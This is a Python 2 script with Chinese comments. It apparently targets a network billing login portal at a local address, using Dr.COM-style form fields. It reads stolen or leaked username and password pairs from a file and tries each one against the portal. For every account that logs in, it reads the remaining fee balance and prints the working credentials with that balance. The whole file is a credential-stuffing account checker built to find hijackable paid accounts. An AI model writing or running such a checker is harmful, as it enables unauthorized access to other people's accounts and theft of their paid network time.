#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests
import re
import time

payload_t = {'DDDDD':'name', 'upass':'pass', '0MKKey':''}

headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Referer":"http://192.168.161.2/"
}

def run(payload):
    # 注销
    requests.get("http://192.168.161.2/F.htm", headers = headers)

    r = requests.post("http://192.168.161.2/", headers = headers, data = payload)
    if r.status_code == 200 :
        if r.headers['Content-length'] == "3712" :
            m = re.findall(r';m=(\d+);UL=', r.text, re.S)
            # if float(m[0]) != 0 :
            #     print "--> redirect to url"
            # else :
            #     print "--> do nothing"

            #time.sleep(1)
            ra = requests.get("http://192.168.161.2/", headers = headers)
            fee = re.findall(r";fee='(\d+) *';", ra.text, re.S)
            amount = (float(fee[0])-float(fee[0])%100)/10000

            if amount > 0 :
                print payload['DDDDD'],payload['upass'],amount
            else :
                print "time exceed"

        # 返回非 3712 均为登录失败
        else :
            print "login failed"

    else :
        print "http return non-200 code"


if __name__=='__main__':
    f = open('ids.txt','r')

    while True:
        line = f.readline()
        if line:
            i = line.split('\t')
            user, pwd = i[0], i[-1]
            #print user,pwd
            payload = {'DDDDD':user, 'upass':pwd, '0MKKey':''}
            run(payload)
            #time.sleep(1)
        else:
            break
    f.close()
